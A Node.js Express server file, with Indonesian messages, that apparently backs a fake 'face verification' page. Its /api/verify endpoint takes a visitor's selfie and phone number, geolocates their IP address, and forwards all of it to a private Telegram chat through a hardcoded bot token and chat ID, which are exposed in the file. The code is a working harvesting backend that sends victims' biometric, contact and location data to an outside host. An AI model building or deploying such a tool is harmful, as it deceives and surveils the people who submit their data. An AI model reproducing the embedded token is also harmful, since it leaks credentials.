const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// HARDCODE - Tidak pakai environment variable
const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN.substring(0, 10)}...`);
console.log(`📱 CHAT_ID: ${CHAT_ID}`);
console.log(`🌐 PORT: ${PORT}`);
console.log('========================================');

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ===== TEST ENDPOINTS =====
app.get('/test-bot', async (req, res) => {
  console.log('🧪 Testing bot...');
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
    const data = await response.json();
    console.log('✅ Bot response:', data);
    res.json(data);
  } catch (err) {
    console.error('❌ Error:', err);
    res.status(500).json({ error: err.message });
  }
});

app.get('/test-send', async (req, res) => {
  console.log('🧪 Testing send message...');
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '🧪 Test message from server!'
      })
    });
    const data = await response.json();
    console.log('✅ Send response:', data);
    res.json(data);
  } catch (err) {
    console.error('❌ Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// ===== VERIFY ENDPOINT =====
app.post('/api/verify', async (req, res) => {
  console.log('========================================');
  console.log('📸 NEW VERIFICATION REQUEST');
  console.log('📸 Time:', new Date().toISOString());
  console.log('========================================');
  
  try {
    const { image, phone } = req.body;
    
    console.log(`📱 Phone: ${phone || 'Not provided'}`);
    console.log(`📸 Image exists: ${image ? 'YES' : 'NO'}`);
    console.log(`📸 Image length: ${image ? image.length : 0}`);
    
    if (!image) {
      console.log('❌ No image received');
      return res.status(400).json({ 
        success: false, 
        error: 'Foto tidak ditemukan' 
      });
    }
    
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    console.log(`📸 Image size: ${buffer.length} bytes`);
    
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    console.log(`🌐 IP: ${ip}`);
    
    let location = 'Tidak diketahui';
    try {
      const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
      if (cleanIp) {
        const locRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city`);
        const locData = await locRes.json();
        if (locData.status === 'success') {
          location = `${locData.city || '-'}, ${locData.regionName || '-'}, ${locData.country || '-'}`;
        }
      }
    } catch (e) {
      console.error('Geolocation error:', e.message);
    }
    
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    console.log(`📍 Location: ${location}`);
    console.log(`🕒 Time: ${timestamp}`);
    
    // ===== SEND TO TELEGRAM =====
    console.log('📤 Sending to Telegram...');
    console.log(`🤖 Token: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`📱 Chat ID: ${CHAT_ID}`);
    
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', 
      `🟡 *VERIFIKASI WAJAH*\n\n` +
      `📱 *User:* ${phone || 'Tidak diketahui'}\n` +
      `📍 *Lokasi:* ${location}\n` +
      `🕒 *Waktu:* ${timestamp}\n` +
      `🌐 *IP:* ${ip}\n\n` +
      `_Foto diterima untuk verifikasi_`
    );
    form.append('photo', buffer, { 
      filename: `verifikasi_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });
    
    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    console.log('📨 Telegram response status:', tgResponse.status);
    console.log('📨 Telegram success:', tgData.ok);
    
    if (!tgData.ok) {
      console.error('❌ Telegram error:', JSON.stringify(tgData));
      return res.status(500).json({ 
        success: false, 
        error: tgData.description || 'Gagal kirim ke Telegram' 
      });
    }
    
    console.log('✅ Photo sent successfully!');
    console.log('========================================');
    res.json({ success: true });
    
  } catch (err) {
    console.error('❌ Error:', err);
    console.error('❌ Stack:', err.stack);
    res.status(500).json({ 
      success: false, 
      error: err.message || 'Terjadi kesalahan server' 
    });
  }
});

// ===== ROOT =====
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== START SERVER =====
app.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log('========================================');
});
